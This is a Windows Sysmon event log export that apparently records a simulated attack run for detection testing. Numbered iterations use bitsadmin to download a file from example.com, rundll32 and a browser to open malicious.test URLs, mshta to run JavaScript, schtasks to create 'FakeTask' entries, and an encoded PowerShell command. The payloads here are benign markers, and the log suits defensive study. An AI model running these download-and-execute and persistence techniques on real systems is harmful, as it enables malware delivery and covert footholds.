"11/27/2025 11:35:03 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:03.643
ProcessGuid: {3a35410f-92cf-6928-4213-000000000b00}
ProcessId: 11036
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /resume job30 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:03 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:03.446
ProcessGuid: {3a35410f-92cf-6928-4013-000000000b00}
ProcessId: 11176
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /addfile job30 http://example.com/file.exe C:\Temp\file30.exe 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:03 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:03.375
ProcessGuid: {3a35410f-92cf-6928-3e13-000000000b00}
ProcessId: 10704
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /create job30 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:03 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:03.301
ProcessGuid: {3a35410f-92cf-6928-3b13-000000000b00}
ProcessId: 12796
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /delete /tn FakeTask30 /f 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:03 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:03.135
ProcessGuid: {3a35410f-92cf-6928-3a13-000000000b00}
ProcessId: 7500
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /create /tn FakeTask30 /tr notepad.exe /sc once /st 23:59 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:03 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:03.043
ProcessGuid: {3a35410f-92cf-6928-3913-000000000b00}
ProcessId: 6232
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/30 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=5A43032AEBD51583832EF3E96F5C81DA,SHA256=076592CA1957F8F357CC201F0015072C612F5770AD7DE85F87F254253C754DD7,IMPHASH=F207A867D6098266EE63A3CA677EB0FF
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:03 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:03.008
ProcessGuid: {3a35410f-92cf-6928-3813-000000000b00}
ProcessId: 9748
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=renderer --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --disable-gpu-compositing --video-capture-use-gpu-memory-buffer --lang=en-US --device-scale-factor=1 --num-raster-threads=2 --enable-main-frame-before-activation --renderer-client-id=45 --time-ticks-at-unix-epoch=-1764255096121325 --launch-time-ticks=11593913678 --metrics-shmem-handle=6104,i,1512315984866792270,10351539690904466539,2097152 --field-trial-handle=2116,i,4317584078096433513,18029839939329323353,262144 --variations-seed-version=main@69c2005032bb14f803911c3458ab063c42bfa450 --trace-process-track-uuid=3190709028478754699 --mojo-platform-channel-handle=8292 /prefetch:1
CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\142.1.84.141\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-c9e6-200000000000}
LogonId: 0x20E6C9
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-927d-6928-c610-000000000b00}
ParentProcessId: 11048
ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --disable-domain-reliability --enable-dom-distiller --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --lso-url=https://no-thanks.invalid --variations-server-url=https://variations.brave.com/seed --variations-insecure-server-url=https://variations.brave.com/seed --flag-switches-begin --flag-switches-end --component-updater=url-source=https://go-updater.brave.com/extensions --do-not-de-elevate --single-argument http://malicious.test/1
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:02 PM","11","Information","File created:
RuleName: -
UtcTime: 2025-11-27 18:05:02.560
ProcessGuid: {3a35410f-92cd-6928-3313-000000000b00}
ProcessId: 6436
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_pbwquryd.bf3.ps1
CreationUtcTime: 2025-11-27 18:05:02.560
User: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:02 PM","8","Information","CreateRemoteThread detected:
RuleName: -
UtcTime: 2025-11-27 18:05:02.163
SourceProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
SourceProcessId: 4396
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGuid: {3a35410f-92ce-6928-3713-000000000b00}
TargetProcessId: 5408
TargetImage: <unknown process>
NewThreadId: 13952
StartAddress: 0x00007FF6970C30D0
StartModule: -
StartFunction: -
SourceUser: DESKTOP-EJG8QJC\Emil Jinu
TargetUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:02 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:02.037
ProcessGuid: {3a35410f-92ce-6928-3613-000000000b00}
ProcessId: 9752
Image: C:\Windows\System32\mshta.exe
FileVersion: 11.00.19041.5794 (WinBuild.160101.0800)
Description: Microsoft (R) HTML Application host
Product: Internet Explorer
Company: Microsoft Corporation
OriginalFileName: MSHTA.EXE
CommandLine: ""C:\Windows\system32\mshta.exe"" javascript:alert('test30') 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=B8ED3F707000C22AEE6BBF961879EA99,SHA256=F8A2FD36FDC35AA8E7E678576A2ECC5D7B3FE6383E73101508E5D7B49443D153,IMPHASH=482D661ACB78B36340AF7BEB797951EE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:01 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:01.639
ProcessGuid: {3a35410f-92cd-6928-3513-000000000b00}
ProcessId: 3580
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=renderer --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --disable-gpu-compositing --video-capture-use-gpu-memory-buffer --lang=en-US --device-scale-factor=1 --num-raster-threads=2 --enable-main-frame-before-activation --renderer-client-id=44 --time-ticks-at-unix-epoch=-1764255096121325 --launch-time-ticks=11592726598 --metrics-shmem-handle=4236,i,7059660960368215473,4953253393453775843,2097152 --field-trial-handle=2116,i,4317584078096433513,18029839939329323353,262144 --variations-seed-version=main@69c2005032bb14f803911c3458ab063c42bfa450 --trace-process-track-uuid=3190709027541712850 --mojo-platform-channel-handle=8824 /prefetch:1
CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\142.1.84.141\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-c9e6-200000000000}
LogonId: 0x20E6C9
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-927d-6928-c610-000000000b00}
ParentProcessId: 11048
ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --disable-domain-reliability --enable-dom-distiller --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --lso-url=https://no-thanks.invalid --variations-server-url=https://variations.brave.com/seed --variations-insecure-server-url=https://variations.brave.com/seed --flag-switches-begin --flag-switches-end --component-updater=url-source=https://go-updater.brave.com/extensions --do-not-de-elevate --single-argument http://malicious.test/1
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:01 PM","11","Information","File created:
RuleName: T1053
UtcTime: 2025-11-27 18:05:01.224
ProcessGuid: {3a35410f-6568-6928-2400-000000000b00}
ProcessId: 1532
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\FakeTask29
CreationUtcTime: 2025-11-27 18:05:01.224
User: NT AUTHORITY\SYSTEM"
"11/27/2025 11:35:01 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:01.181
ProcessGuid: {3a35410f-92cd-6928-3313-000000000b00}
ProcessId: 6436
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAdQBzAHAAaQBjAGkAbwB1AHMAXwBlAHYAZQBuAHQAXwAyADkAJwA= 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:01 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:01.038
ProcessGuid: {3a35410f-92cd-6928-3213-000000000b00}
ProcessId: 14492
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=crashpad-handler ""--user-data-dir=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data"" /prefetch:4 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data\Crashpad"" ""--metrics-dir=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data"" --url=https://cr.brave.com --annotation=plat=Win64 --annotation=prod=Brave --annotation=ver=142.1.84.141 --initial-client-data=0x120,0x124,0x128,0xfc,0x12c,0x7ffd9b025a28,0x7ffd9b025a34,0x7ffd9b025a40
CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-92cc-6928-3113-000000000b00}
ParentProcessId: 4576
ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --single-argument http://malicious.test/29
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:00 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:00.746
ProcessGuid: {3a35410f-92cc-6928-3113-000000000b00}
ProcessId: 4576
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --single-argument http://malicious.test/29
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-92cb-6928-2213-000000000b00}
ParentProcessId: 4660
ParentImage: C:\Windows\System32\rundll32.exe
ParentCommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/29 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:00 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:00.372
ProcessGuid: {3a35410f-92cc-6928-2f13-000000000b00}
ProcessId: 1568
Image: C:\Windows\System32\wbem\WMIC.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: WMI Commandline Utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: wmic.exe
CommandLine: ""C:\Windows\System32\Wbem\WMIC.exe"" os get Caption 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=EBE8CE528A79B5CC0782E8DFDA250600,SHA256=DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:00 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:00.212
ProcessGuid: {3a35410f-92cc-6928-2d13-000000000b00}
ProcessId: 12532
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /complete job29 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:00 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:00.124
ProcessGuid: {3a35410f-92cc-6928-2b13-000000000b00}
ProcessId: 12352
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /resume job29 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:00 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:00.014
ProcessGuid: {3a35410f-92cc-6928-2913-000000000b00}
ProcessId: 5676
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /addfile job29 http://example.com/file.exe C:\Temp\file29.exe 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:34:59 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:04:59.881
ProcessGuid: {3a35410f-92cb-6928-2613-000000000b00}
ProcessId: 11896
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /create job29 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:34:59 PM","11","Information","File created:
RuleName: -
UtcTime: 2025-11-27 18:04:59.852
ProcessGuid: {3a35410f-92ca-6928-1a13-000000000b00}
ProcessId: 3836
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_2kpi2jyf.eqh.ps1
CreationUtcTime: 2025-11-27 18:04:59.851
User: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:34:59 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:04:59.780
ProcessGuid: {3a35410f-92cb-6928-2413-000000000b00}
ProcessId: 11596
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /delete /tn FakeTask29 /f 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:34:59 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:04:59.648
ProcessGuid: {3a35410f-92cb-6928-2313-000000000b00}
ProcessId: 14820
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /create /tn FakeTask29 /tr notepad.exe /sc once /st 23:59 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:34:59 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:04:59.578
ProcessGuid: {3a35410f-92cb-6928-2213-000000000b00}
ProcessId: 4660
Image: C:\Windows\System32\rundll32.exe
